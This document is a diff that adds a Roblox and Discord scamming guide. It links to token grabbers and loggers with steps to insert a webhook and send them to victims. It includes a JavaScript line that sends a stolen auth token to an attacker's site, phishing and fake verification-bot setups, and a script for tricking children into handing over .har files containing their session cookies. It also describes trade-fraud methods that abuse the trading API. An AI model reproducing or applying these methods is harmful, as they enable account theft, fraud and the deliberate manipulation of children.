@@ -1,0 +1,163 @@
+Mercurial Grabber Stub | Best Stub
+----------------------------------------------------------------------------------
+https://github.com/NightfallGT/Mercurial-Grabber/releases/tag/v1.0
+----------------------------------------------------------------------------------
+1. Download it and open mercurial
+2. Enter what you want the stub to do (Make sure check hide console or get sus)
+3. Go to set up, put your webhook in, and build
+4. Rename and send to victims
+5. Don't dm me for help
+
+2in1 Logger
+---------------------------------------------------
+https://up-to-down.net/355422/2in1logger
+---------------------------------------------------
+1. Download the file
+2. Edit it
+3. FInd where it says replace webhook and replace the webhook
+4. Don't dm me for help
+
+Rbxflip Console
+-----------------------------------------------------------
+https://github.com/karlopy/rbxflip-console-logger
+-----------------------------------------------------------
+Setting it up:
+
+1. Make a website on 000webhost
+2. Go to file manager
+3. Upload the files
+4. Replace ur webhook in sc.php line 97
+5. Save and Close
+
+How to log people:
+``var token = localStorage.getItem('auth._token.local');
+await fetch("https://yourwebsitehere.com/sc.php?t=" + token);``
+
+Replace the code with your new website make a vid like this: https://www.youtube.com/watch?v=AEopKzkFME8&t=38s
+send to your victims/make a youtube on it.
+
+Rover Plus Method | OP
+------------------------------
+https://betterdiscord.app/
+------------------------------
+1. Download BetterDiscord
+2. Watch this Video (https://www.youtube.com/watch?v=CpsHHXUX5yM&ab_channel=NoTextToSpeech)
+3. Download this plugin(https://raw.githubusercontent.com/Fraserbc/BetterDiscord-Embeds/master/SendEmbeds.plugin.js) this plugin will let you make embed messages
+4. Do an embed like this(https://media.discordapp.net/attachments/896671009535578165/896708797748351016/unknown.png) and this is the RoVer Plus Pfp(https://media.discordapp.net/attachments/896671009535578165/896709116565798952/RoVer_Plus.png) and go to https://roblox.com.so/ to make a fake RoVer Plus Verification Game Make
+ID Game: ``713226354``
+Make a hyperlink like this -> ``[https://www.roblox.com/games/713226354/RoVer-Verification](your phishing link)``
+5. Now send it to random kid on adopt me
+6. Dm me if you need help
+
+Fake Bloxlink Verification Bot
+---------------------------------------------------
+https://link-to.net/355422/BloxlinkMethod
+---------------------------------------------------
+1. Create a Python repl in repl.it
+2. Go to the link and copy everything
+3. Paste it all in
+4. Go to Discord Developer Portal
+5. Create Application then create bot
+6. Copy Client Token and paste it in the code
+7. Change the code to your liking
+8. Run the bot and you're done
+
+Tutorial:
+https://streamable.com/se6319
+
+SelfBot Logger
+----------------
+Download Me (https://cdn.discordapp.com/attachments/871719660830216212/871719675082457108/Selfbot.zip)
+----------------
+1. Install python
+2. Extract the zip
+3. Edit the python file in the folder
+4. Scroll to line 2301
+5. Replace the webhook with yours
+6. Save and add the folder to archive (make a zip again)
+7. Send the zip to victims
+
+Har Method | Leaked
+1. go up to somebody on any game (preferably Trade Hangout, cnp hangout, mocap, Dahood)
+
+2. if it's a girl say "oh my god, your outfit is so pretty :D" if it's a boy say "your avatar is sick"
+
+3. they will say "thank you"
+
+4. ask them "could I make you free 3d art?"
+
+5. if they say yes, say "yay! could you stand in the corner here for me so I can see something real quick"
+
+6. they say yes then stand in the corner, say "perfect! do you have something like dis/co? so I can send you the gfx :D"
+
+7. get their discord, tell them that it will take like an hour or two to finish the gfx.
+
+8. ask them for their "appearance renderer" if they ask what it is say that you need it so you can import their avatar into cinema 4d studio.
+
+9. if they ask how they can do that, send them the video and pray that they don't know what har is!
+
+10. they should send you the .har file, open it and fullscreen, ctrl+f and type "ROBLOSECURITY" then click next 2 times, copy everything but the " and.
+
+and now you got their cookie ;D
+the video you should send them - https://www.youtube.com/watch?v=p9Dnu_e3_Yg
+
+
+Api Method
+1. You find someone, in a trade hangout or something and add them on discord. After doing that you send them a trade (for example, all their items for you small).
+
+2. Head to https://trades.roblox.com/v1/trades/Outb...&limit=100 and get the outbound trade ID.
+
+3. Tell the user you sent the trade, to go to https://trades.roblox.com/docs#!/Trades/...eId_accept and paste the outbound trade ID from step 2, in "trade ID" on the second link. This will make the user auto accept the trade
+
+SECOND METHOD
+
+1. First you want to find a victim and try to get close and pretend you want to help them ( or any other way ). After finding this person.. you want to send them a scam trade aka their bigs for your small.
+
+2. After sending that trade you want to head over to https://trades.roblox.com/v1/trades/Outbound?sortOrder=Asc&limit=100 to get the id for the scam trade. ( the first set of numbers )
+
+3. Then you have to convince the victim to head over to https://trades.roblox.com/docs#!/Trades/get_v1_trades_tradeId and tell them to paste the set of numbers into trade id - required and click try out!.
+
+4. When the victim clicks try out, it auto accepts the scam trade. Enjoy!
+
+
+Cookie Checker Bot
+-------------------
+Cookie_Checker(https://cdn.discordapp.com/attachments/888608391600160830/891074044722565150/Cookie_Checker.txt)
+-------------------
+1. Go to https://discord.com/developers and make a bot
+2. Go to https://repl.it/ make a python paste the Cookie Checker Text
+3. Go to the bottom and you will see
+``client.run('Yourdiscordbottoken') #replace with your bot token``
+4. Copy your token bot and replace it.
+
+Cookie Checker Logger | OP
+----------------------------------------------------------
+https://link-to.net/355422/CookieCheckerLogger
+----------------------------------------------------------
+1. Watch the video
+2. Set it up and upload the HTML to 000webhost
+3. When they put their cookie in it will be in the spreadsheet
+4. You’ll have their cookie
+
+
+Double Trade
+1. Send 2 trade to the victim, One for all of their bigs for ur smalls
+one for your bigs for their smalls and add 2 Robux
+after sending the trades
+2. Buy a 2 Robux t-shirt fast
+recommended on pc
+open a tab where ur reading to buy the t-shirt the fastest you can
+3. after that they would probly accept the seconde and try to beam you
+because they think ur retarted with trust trade
+but the seconde trade wont be accepted
+you make a story saying
+because you didn't accept both trades
+and then when they accept both
+profits!
+https://www.youtube.com/watch?v=erbGnszbkt0
+
+
+RDT Stands for reverse double trade
+This method is the opposite of the double trade method
+For this method, you need to trick the victim into thinking you're helping them double trade another person.
+You also need to somehow trick them into joining your group which somehow has Robux. The way a normal double trade works is that you send them two trades and one has your good stuff and their bad stuff, and then one has their good stuff and their bad stuff. Then added on the trade that has your stuff has 5 Robux added on that will be spent after you send your good trade. But instead of this method, you're going to be tricking them into sending your account these two trades, but when they spend their Robux you will replace it with 5 new Robux from the group that you previously had them join. (So you must have a group with at least a few Robux to do this method and a premium account of course or two)
